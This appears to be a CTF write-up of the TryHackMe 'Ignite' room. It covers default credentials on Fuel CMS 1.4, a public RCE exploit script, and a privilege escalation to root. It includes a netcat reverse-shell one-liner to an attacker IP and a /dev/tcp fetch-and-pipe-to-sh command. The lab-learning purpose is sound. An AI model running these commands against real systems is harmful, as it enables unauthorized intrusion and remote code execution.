---
title: TryHackMe - Ignite
layout: post
categories:
- TryHackMe
tag:
- ctf,
- privesc,
- exploit
image: "/assets/img/ignite.png"
image_alt: ignite
---

A new start-up has a few issues with their web server.. Let's start.

<br>

## 1. Ignite 

Root the box! Designed and created by DarkStar7471, built by Paradox.
Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.

<br>

### 1.1 User.txt

Let's do a nmap scan first.

```
$ nmap -sSCV -A -O 10.10.80.114
```

![nmap](/assets/img/tryhackme/ignite/nmap.png)

Only port 80/tcp is open. If we look carefully, there is a directory information in **`robots.txt`**. Disallow: **`/fuel/`**.

![robots](/assets/img/tryhackme/ignite/robots.png)

But first, let's check the website running on port 80. 
Here is a page like this.

![home](/assets/img/tryhackme/ignite/home.png)

As far as I can see, the fuel cms version 1.4 is used here.
There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
Let's go to this directory and see what comes up.

![login](/assets/img/tryhackme/ignite/login.png)

An admin login page appears. By default I tried **`admin:admin`** directly and logged in D:
I didn't expect the admin page to be so easy to reach. Let's see what we find here.

![fuel](/assets/img/tryhackme/ignite/fuel.png)

I'm checking every link on the page to see if we can somehow apply a reverse shell.
But I couldn't find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.

![search](/assets/img/tryhackme/ignite/search.png)

We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let's take a look at the most recent of them.

![db](/assets/img/tryhackme/ignite/db.png)

I'm downloading the exploit file from here. And now let's run it.

```
$ python 50477.py -u http://10.10.9.177
```

![payload](/assets/img/tryhackme/ignite/payload.png)

We log in to the system, and we provide a clearer connection by using one of the [pentest monkey's reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

![monkey](/assets/img/tryhackme/ignite/monkey.png)

First, we set up a netcat listener on our own machine.

```
$ nc -nlvp 4444
```

Then we enter the following code on the target machine.

```
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.86.168 4444 >/tmp/f
```

And we are inside.

![in](/assets/img/tryhackme/ignite/in.png)

To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.

```
$ ls -la /home
$ ls -la /home/www-data
$ cat /home/www-data/user.txt
```

![user-flag](/assets/img/tryhackme/ignite/user-flag.png)

<br>

### 1.2 Root.txt

I'm scanning the system with [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20230319) to upgrade privileges. 

First, I run the following code in the directory where linpeas.sh is located on my own machine.

```
$ sudo nc -q 5 -lvnp 80 < linpeas.sh
```

Then I run the following code on the target machine.

```
$ cat < /dev/tcp/10.8.86.168/80 | sh
```

![run](/assets/img/tryhackme/ignite/run.png)

And it worked. Now we're waiting to see if we can find anything useful.

![linpeas](/assets/img/tryhackme/ignite/linpeas.png)

**`Password: ******`**

We found a password information, but I don't know what it is for. But let's try it for root.

First, let's call a shell using python. Then let's try logging in.

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ su root
Password: ******
```

It worked :D. We have successfully rooted.

![privesc](/assets/img/tryhackme/ignite/privesc.png)

Now we can get to root.txt let's get the flag.

![root-flag](/assets/img/tryhackme/ignite/root-flag.png)

<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
